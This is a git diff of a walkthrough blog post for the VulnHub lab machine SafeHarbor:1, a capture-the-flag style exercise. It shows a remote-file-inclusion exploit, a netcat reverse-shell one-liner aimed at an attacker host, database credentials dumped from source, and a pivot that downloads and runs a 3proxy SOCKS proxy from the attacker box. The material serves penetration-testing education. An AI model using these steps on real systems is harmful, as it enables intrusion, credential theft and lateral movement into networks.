@@ -1,6 +1,6 @@
 ---
 title: VulnHub Walkthrough SafeHarbor:1
-published: true
+published: false
 ---
 
 I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.
@@ -163,7 +163,7 @@ A quick test reveals that the parameter "p" uses include function: http://192.16
 
 ```
 
-Let me host a PHP file to execute the command 'id' on my Kali (attacker) box and include it to see if that works. 
+Let me host a PHP file on my Kali (attacker) box to execute the command 'id' and include the remote file to see if that works. 
 
 ```php
 <?php system('id'); ?>
@@ -182,7 +182,7 @@ That worked!
 ![command_execution](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)
 
 
-Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php) or you can achieve the same using one of the one liners below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can use the workaround mentioned here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
+Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php) or you can achieve the same using a one liner shown below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can use the workaround mentioned here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
 
 ```php
 <?php system('nc attacker_ip port -e /bin/sh'); ?>
@@ -191,6 +191,136 @@ Let's go ahead and get a reverse shell, using the default one available on Kali 
 Great! Now I have a reverse shell:
 
 ![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.gif)
+
+What should I be looking for next? Maybe check the PHP files to see if there are any secrets or hard-coded credentials.
+
+```php
+cat balance.php
+<?php
+session_start();
+
+if(is_null($_SESSION["loggedin"])){
+  header("Location: /");
+}
+
+
+$dbServer = mysqli_connect('mysql', 'root', 'TestPass123!', 'HarborBankUsers');
+$user = $_SESSION["username"];
+$balanceQueryResult = mysqli_query($dbServer, "SELECT balance FROM users WHERE username = '$user'");
+$balanceRow = mysqli_fetch_row($balanceQueryResult);
+$balance = $balanceRow[0];
+?>
+
+```
+
+So where are the other backend components since I found only one interface. Let's look at the cheatsheet: [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+
+```Platform/software specific tests:
+Checks to determine if we're in a Docker container
+```
+
+After looking up on how to determine that, thanks to this post on [StackOverflow](https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container)
+
+This comes as no surprise, but verify first :-)
+
+```sh
+cat /proc/1/cgroup
+12:cpuset:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+11:pids:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+10:blkio:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+9:net_cls,net_prio:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+8:rdma:/
+7:hugetlb:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+6:memory:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+5:cpu,cpuacct:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+4:perf_event:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+3:freezer:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+2:devices:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+1:name=systemd:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
+0::/system.slice/containerd.service
+```
+
+Alright, I could now run a port scan to find all live hosts or simply do an arp scan to find the neighbours:
+
+```
+arp -a
+harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [ether]  on eth0
+? (172.20.0.1) at 02:42:f8:d6:41:d8 [ether]  on eth0
+harborbank_apache_1.harborbank_backend (172.20.0.6) at 02:42:ac:14:00:06 [ether]  on eth0
+harborbank_apache_v2_1.harborbank_backend (172.20.0.4) at 02:42:ac:14:00:04 [ether]  on eth0
+harborbank_mysql_1.harborbank_backend (172.20.0.138) at 02:42:ac:14:00:8a [ether]  on eth0
+
+```
+
+**Privilege escalation? No! Let's just pivot**
+
+
+```
+docker pull alpine
+sudo docker run -it --rm alpine /bin/sh
+apk add --no-cache build-base
+wget https://github.com/z3APA3A/3proxy/archive/devel.zip
+unzip devel.zip 
+cd 3proxy-devel
+make Makefile.Linux
+
+On your host machine:
+docker cp 48b2378a0e01:/home/3proxy-devel/bin/3proxy ./
+
+```
+
+Config file:
+
+```
+log /tmp/3proxy.log D
+
+external 0.0.0.0
+
+internal 0.0.0.0
+
+auth none
+
+flush
+
+proxy -p3128 -n
+
+flush
+
+socks -p1080
+```
+
+
+```
+root@kali:~# nc -lvvp 8888
+listening on [any] 8888 ...
+192.168.1.21: inverse host lookup failed: Unknown host
+connect to [192.168.1.22] from (UNKNOWN) [192.168.1.21] 35046
+Linux 707af7b0d61f 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 Linux
+sh: w: not found
+uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
+/bin/sh: can't access tty; job control turned off
+/ $ wget http://192.168.1.22/3proxy
+Connecting to 192.168.1.22 (192.168.1.22:80)
+wget: can't open '3proxy': Permission denied
+/ $ cd /tmp      
+/tmp $ wget http://192.168.1.22/3proxy_alp
+Connecting to 192.168.1.22 (192.168.1.22:80)
+3proxy_alp           100% |*******************************|  1067k  0:00:00 ETA
+
+/tmp $ chmod +x 3proxy_alp
+/tmp $ wget http://192.168.1.22/config.cfg
+Connecting to 192.168.1.22 (192.168.1.22:80)
+wget: can't open 'config.cfg': File exists
+/tmp $ ls
+3proxy_alp
+config.cfg
+lincheck.sh
+p
+sess_acb58e455065ff339e002533dda99949
+/tmp $ ./3proxy_alp config.cfg
+
+```
+
 
 There should be whitespace between paragraphs.
 
